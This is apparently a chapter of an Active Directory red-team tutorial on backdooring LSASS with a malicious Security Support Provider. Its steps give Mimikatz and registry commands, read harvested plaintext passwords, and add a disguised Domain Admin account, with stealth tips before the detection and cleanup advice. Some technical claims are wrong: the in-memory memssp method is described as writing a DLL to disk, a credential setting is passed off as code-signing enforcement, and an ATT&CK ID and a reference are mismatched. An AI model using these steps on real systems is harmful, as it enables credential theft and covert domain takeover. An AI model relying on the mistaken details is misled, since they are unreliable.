# Security Support Provider (SSP) Backdoor

## Overview

A **Security Support Provider (SSP)** is a DLL that Windows loads to handle authentication protocols. By injecting a malicious SSP DLL via Mimikatz or by registering it in the registry, the attacker's custom SSP can:

1. **Log all plaintext passwords** as users authenticate to the machine
2. **Execute commands** when certain authentication events occur
3. **Provide a persistent backdoor** that survives reboots

The SSP backdoor is **persistent across reboots** because the malicious DLL is registered in the LSA (Local Security Authority) configuration. Every time the machine starts, LSASS loads the DLL.

**Mimikatz built-in SSP** (`mimilib.dll`) logs every user's password in plaintext to a log file.

---

## Prerequisites

- **SYSTEM privileges** on the target machine (Domain Controller or domain-joined server)
- Ability to write a DLL to `C:\Windows\System32\`
- Tools: Mimikatz (for `misc::memssp`), compiled custom SSP DLL (for manual installation)

---

## Step 1: Deploy the SSP DLL

### Method A: Mimikatz `misc::memssp` (In-Memory + Disk)

```cmd
mimikatz.exe privilege::debug
misc::memssp
```

This command:
1. Drops a copy of `mimilib.dll` to `C:\Windows\System32\`
2. Registers `mimilib` in the `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` registry key
3. The DLL persists after reboot

### Method B: Manual Installation (Custom SSP DLL)

**Copy the malicious SSP DLL to System32:**

```cmd
copy evilssp.dll C:\Windows\System32\evilssp.dll
```

**Add the DLL name (without extension) to the Security Packages registry key:**

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0ikeext\0evilssp" /f
```

### Method C: Using PowerShell

```powershell
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$currentPackages = Get-ItemProperty -Path $regPath -Name "Security Packages" | Select-Object -ExpandProperty "Security Packages"
$newPackages = $currentPackages + "evilssp"
# Note: REG_MULTI_SZ is an array of strings
Set-ItemProperty -Path $regPath -Name "Security Packages" -Value $newPackages
```

---

## Step 2: Trigger a Reboot (or Wait for DLL Load)

The SSP is loaded by LSASS at boot time. A **system restart** is required for manual changes to take effect.

When using Mimikatz `misc::memssp`, it uses `NtCreateThreadEx` to inject into LSASS directly — the SSP is active immediately without a reboot.

---

## Step 3: Retrieve Captured Credentials

### Mimikatz mimilib.dll

The default `mimilib.dll` SSP logs all passwords to:

```
C:\Windows\System32\mimilsa.log
```

```cmd
type C:\Windows\System32\mimilsa.log
```

Each line will show `Domain\User : Password` for every interactive logon, RunAs, or network authentication.

### Custom SSP DLL

A custom SSP can:
- Write credentials to a hidden file
- Send them over the network (DNS, HTTP, SMB callback)
- Store them in a registry key
- Execute a command for each new credential harvested

---

## Step 4: Use the Backdoor

### Harvest Domain Admin Credentials

When a Domain Admin authenticates to the DC (locally, via RDP, RunAs, or PSExec), the SSP logs their **domain password in plaintext**.

Once harvested:

```cmd
# Use the credentials immediately
net use \\DC01\C$ /user:DOMAIN\DomainAdmin PlaintextPassword!
```

### Create Additional Backdoor Users with Harvested Credentials

```powershell
$cred = Get-Credential DOMAIN\Administrator
# Create a stealth backdoor user with harvested DA credentials
New-ADUser -Name "BackupSvcAcct" -AccountPassword (ConvertTo-SecureString "Pass123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "BackupSvcAcct"
```

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **Reboot Required** | Manual registry modification requires a reboot (suspicious on a DC). The `misc::memssp` method avoids this. |
| **DLL on Disk** | `mimilib.dll` is written to `C:\Windows\System32\` — very suspicious if detected. Use a renamed, custom-compiled DLL. |
| **Registry Key** | Adding a Security Package to `Lsa\Security Packages` is monitored by EDR and generates event 4657. |
| **Process Injection** | `misc::memssp` injects into LSASS via `NtCreateThreadEx` — detected by Sysmon event 8. |
| **Log File** | `mimilsa.log` contains plaintext passwords — a forensic goldmine if discovered. |
| **Reboot Survival** | Unlike skeleton key, the SSP backdoor survives reboots. This is both stealthy and risky. |
| **SSP Signature** | Having an unknown SSP loaded is highly anomalous. Known DLLs: `kerberos.dll`, `msv1_0.dll`, `schannel.dll`, `wdigest.dll`, `tspkg.dll`, `ikeext.dll`, `cloudap.dll`. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4657** | A registry value was modified (`Security Packages` key) | DC/Server Security Log |
| **4688** | A new process has been created (copying mimilib.dll) | DC/Server Security Log |
| **7045** | A service was installed on the system | System Log |
| **1000** | Application Error (if SSP DLL crashes) | Application Log |

### Sysmon Events

| Event ID | Description |
|----------|-------------|
| **7** | Image loaded (mimilib.dll loaded by LSASS) |
| **8** | CreateRemoteThread (injection into LSASS) |
| **11** | FileCreate (mimilib.dll written to System32) |
| **13** | Registry value set (Security Packages modified) |

### Detection Indicators

1. **Unknown DLL loaded by LSASS** — Use Process Explorer or Task Manager to view LSASS loaded DLLs
2. **Registry key `Security Packages` modified** — Any change to this key (especially adding a non-standard SSP)
3. **File `mimilsa.log`** — Presence of this file in `C:\Windows\System32\`
4. **LSASS process injection** — Sysmon event 8 for LSASS
5. **`mimilib.dll` in System32** — Known Mimikatz SSP DLL

### Detection Commands

**List loaded SSPs via PowerShell:**

```powershell
# View Security Packages registry value
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages"
```

**List loaded DLLs in LSASS (via Task Manager):**

```cmd
tasklist /m /fi "PID eq lsass_pid"
```

**List SSPs programmatically (C# or PowerShell):**

```powershell
# Enumerate LSA packages via Win32 API
[System.Diagnostics.Process]::GetProcessesByName("lsass") | ForEach-Object { $_.Modules | Select-Object ModuleName, FileName }
```

### Forensic Artifacts

- `C:\Windows\System32\mimilsa.log` — plaintext password log
- `C:\Windows\System32\mimilib.dll` — Mimikatz SSP
- Registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
- Registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages\Config` (if custom config exists)
- Memory: LSASS memory dump will show the SSP string and captured passwords

---

## Cleanup / Reversal

### Remove the Malicious SSP DLL

```cmd
del C:\Windows\System32\evilssp.dll
```

Or for Mimikatz:

```cmd
del C:\Windows\System32\mimilib.dll
```

### Remove Registry Entry

```powershell
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$currentPackages = Get-ItemProperty -Path $regPath -Name "Security Packages" | Select-Object -ExpandProperty "Security Packages"
$cleanPackages = $currentPackages | Where-Object { $_ -ne "evilssp" -and $_ -ne "mimilib" }
Set-ItemProperty -Path $regPath -Name "Security Packages" -Value $cleanPackages
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0ikeext" /f
```

### Remove Log File

```cmd
del C:\Windows\System32\mimilsa.log
```

### Reboot the Machine

A reboot is required to remove the SSP from LSASS memory.

```cmd
shutdown /r /t 0 /m \\SERVER
```

### Verify Cleanup

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages"
```

After reboot, verify that only the default SSPs are loaded:

```
kerberos
msv1_0
schannel
wdigest
tspkg
ikeext
```

### Post-Cleanup

- Check all Domain Controllers and critical servers for SSP backdoors
- Review `C:\Windows\System32\` for any suspicious DLLs (sort by date modified)
- Audit registry for any new Security Package entries
- Consider LSASS Protected Process Light (PPL) to prevent future SSP injection
- Reset all privileged account passwords (they may have been captured by the SSP)

---

## Defenses Against SSP Backdoors

### Enable LSASS Running as PPL

```powershell
# Enable RunAsPPL
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -PropertyType DWORD -Force
```

### Enable Credential Guard

Via Group Policy:
```
Computer Configuration > Administrative Templates > System > Device Guard
Turn On Virtualization Based Security → Enabled
Select Platform Security Level: Secure Boot or Secure Boot + DMA
Credential Guard Configuration: Enabled with UEFI lock
```

### Monitor LSA Registry Key

Set a SACL on `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` to audit all access.

### Code Signing Enforcement for LSA Plugins

```powershell
# Only allow signed LSA plugins
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name DisableDomainCreds -Value 1 -PropertyType DWORD -Force
```

---

## References

- [Mimik Wiki — misc::memssp](https://github.com/gentilkiwi/mimikatz/wiki/module-~-misc#memssp)
- [ADSecurity — SSP Backdoor](https://adsecurity.org/?p=1760)
- [Harmj0y — SSP Persistence](http://blog.harmj0y.net/redteaming/abusing-active-directory-acls-adminsdholder/)
- MITRE ATT&CK: T1556.006 (Modify Authentication Process: SSP)
- MITRE ATT&CK: T1556.005 (Modify Authentication Process: Password Filter)

---

**Next:** [08 - Certificate Persistence](08_Certificate_Persistence.md)
